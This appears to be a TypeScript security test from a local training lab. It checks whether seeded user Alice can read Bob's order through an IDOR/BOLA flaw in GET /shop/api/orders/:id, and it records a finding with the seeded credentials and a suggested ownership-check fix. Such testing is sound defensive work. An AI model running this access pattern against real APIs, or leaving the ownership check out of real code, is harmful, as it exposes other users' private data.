/**
 * tests/idor-bola.test.ts
 *
 * Security test: IDOR / BOLA — GET /shop/api/orders/:id
 *
 * Scenario:
 *  1. Alice logs in and obtains a session token.
 *  2. Alice fetches her own order to confirm normal access works (baseline).
 *  3. Alice attempts to access Bob's order using her own session token.
 *  4. Result is evaluated and written to tests/results/idor-result.json.
 *
 * Exit codes:
 *   0 — test ran cleanly AND vulnerability was reproduced (expected in training env)
 *   1 — test ran cleanly but vulnerability was NOT reproduced (vuln was fixed)
 *   2 — test infrastructure error (server not up, login failed, etc.)
 *
 * Run (server must be on :4000):
 *   node node_modules/tsx/dist/cli.mjs tests/idor-bola.test.ts
 *
 * ⚠️  FOR LOCAL SECURITY TRAINING ONLY — localhost-restricted.
 */

import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { httpRequest, loginAs, bearer, BASE } from "./lib/http-client.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const ALICE_ORDER_ID = "order-alice-001"; // seeded in db.ts
const BOB_ORDER_ID   = "order-bob-001";   // seeded in db.ts

export interface IDORFinding {
  testName: string;
  vulnerability: string;
  severity: string;
  affectedEndpoint: string;
  cwe: string;
  reproductionSteps: string[];
  evidence: {
    aliceLogin: { httpStatus: number; userId: string };
    aliceOwnOrder: { httpStatus: number; body: unknown };
    bobOrderAccessedByAlice: { httpStatus: number; body: unknown };
  };
  testPassed: boolean;         // did the test execute without infrastructure errors?
  vulnerabilityReproduced: boolean; // was the IDOR actually exploitable?
  details: string;
  testedAt: string;
}

async function runIDORTest(): Promise<IDORFinding> {
  console.log("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  console.log("  BUGBOUNTY SWARM — IDOR/BOLA Security Test");
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");

  // ── Step 1: Alice logs in ──────────────────────────────────────────────────
  console.log("[1/4] Logging in as Alice (alice@example.com)…");
  const alice = await loginAs("alice@example.com", "Alice123!");
  console.log(`  ✓ Logged in as ${alice.name} (${alice.userId})`);

  const auth = bearer(alice.token);

  // ── Step 2: Alice fetches her own order (baseline) ─────────────────────────
  console.log(`\n[2/4] Alice fetches her own order (${ALICE_ORDER_ID})…`);
  const ownOrderResult = await httpRequest(
    `${BASE}/orders/${ALICE_ORDER_ID}`,
    "GET",
    auth
  );
  console.log(`  HTTP ${ownOrderResult.status}`);
  if (ownOrderResult.status !== 200) {
    throw new Error(`Baseline failed: Alice cannot read her own order. HTTP ${ownOrderResult.status}`);
  }
  console.log("  ✓ Own order accessible (expected).");

  // ── Step 3: Alice attempts IDOR to Bob's order ─────────────────────────────
  console.log(`\n[3/4] Alice attempts to access Bob's order (${BOB_ORDER_ID}) using her token…`);
  const bobOrderResult = await httpRequest(
    `${BASE}/orders/${BOB_ORDER_ID}`,
    "GET",
    auth
  );
  console.log(`  HTTP ${bobOrderResult.status}`);
  console.log("  Response:", JSON.stringify(bobOrderResult.body, null, 4));

  // ── Step 4: Evaluate ───────────────────────────────────────────────────────
  console.log("\n[4/4] Evaluating result…");

  const bobBody = bobOrderResult.body as Record<string, unknown>;
  const vulnReproduced =
    bobOrderResult.status === 200 && bobBody["userId"] === "user-bob";

  if (vulnReproduced) {
    console.log("  ⚠️  VULNERABILITY CONFIRMED");
    console.log("     Alice (user-alice) successfully read Bob's order (user-bob).");
    console.log("     Exposed userId:", bobBody["userId"]);
    console.log("     Exposed orderId:", bobBody["id"]);
  } else {
    console.log(`  ✓  Access correctly blocked (HTTP ${bobOrderResult.status}).`);
    console.log("     Vulnerability NOT reproduced — the endpoint appears to be fixed.");
  }

  return {
    testName: "IDOR-001",
    vulnerability: "Insecure Direct Object Reference (IDOR / BOLA)",
    severity: "High",
    affectedEndpoint: "GET /shop/api/orders/:id",
    cwe: "CWE-284: Improper Access Control",
    reproductionSteps: [
      "1. POST /shop/api/auth/login — credentials: alice@example.com / Alice123!",
      "2. Store the returned Bearer token.",
      `3. GET /shop/api/orders/${BOB_ORDER_ID} with Alice's Bearer token (not Bob's).`,
      "4. Observe HTTP 200 and Bob's private order data returned — no ownership check performed.",
    ],
    evidence: {
      aliceLogin: { httpStatus: 200, userId: alice.userId },
      aliceOwnOrder: { httpStatus: ownOrderResult.status, body: ownOrderResult.body },
      bobOrderAccessedByAlice: { httpStatus: bobOrderResult.status, body: bobOrderResult.body },
    },
    testPassed: true,
    vulnerabilityReproduced: vulnReproduced,
    details: vulnReproduced
      ? `GET /shop/api/orders/:id returns order data without verifying ownership. ` +
        `Alice (user-alice) retrieved Bob's order (${BOB_ORDER_ID}, userId=user-bob) ` +
        `using only her own Bearer token. ` +
        `Fix: add "if (order.userId !== req.userId) return res.status(403).json(...)" before returning.`
      : `The endpoint blocked Alice from reading Bob's order (HTTP ${bobOrderResult.status}). ` +
        `Ownership check appears to be in place.`,
    testedAt: new Date().toISOString(),
  };
}

// ── Entry point ───────────────────────────────────────────────────────────────
const resultsDir = path.join(__dirname, "results");
if (!fs.existsSync(resultsDir)) fs.mkdirSync(resultsDir, { recursive: true });

runIDORTest()
  .then((finding) => {
    const outPath = path.join(resultsDir, "idor-result.json");
    fs.writeFileSync(outPath, JSON.stringify(finding, null, 2));
    console.log(`\n━━━ Result written to: ${outPath}`);
    console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");

    if (finding.vulnerabilityReproduced) {
      // Exit 0: test ran successfully AND confirmed the expected vulnerability
      process.exit(0);
    } else {
      // Exit 1: test ran fine but vulnerability not reproduced (endpoint was fixed)
      console.error("FAIL: Vulnerability was NOT reproduced — expected it to be present.");
      process.exit(1);
    }
  })
  .catch((err: unknown) => {
    const outPath = path.join(resultsDir, "idor-result.json");
    const errFinding: IDORFinding = {
      testName: "IDOR-001",
      vulnerability: "Insecure Direct Object Reference (IDOR / BOLA)",
      severity: "High",
      affectedEndpoint: "GET /shop/api/orders/:id",
      cwe: "CWE-284: Improper Access Control",
      reproductionSteps: [],
      evidence: {
        aliceLogin: { httpStatus: 0, userId: "" },
        aliceOwnOrder: { httpStatus: 0, body: null },
        bobOrderAccessedByAlice: { httpStatus: 0, body: null },
      },
      testPassed: false,
      vulnerabilityReproduced: false,
      details: `Test infrastructure error: ${String(err)}`,
      testedAt: new Date().toISOString(),
    };
    fs.writeFileSync(outPath, JSON.stringify(errFinding, null, 2));
    console.error("Test infrastructure error:", err);
    process.exit(2);
  });
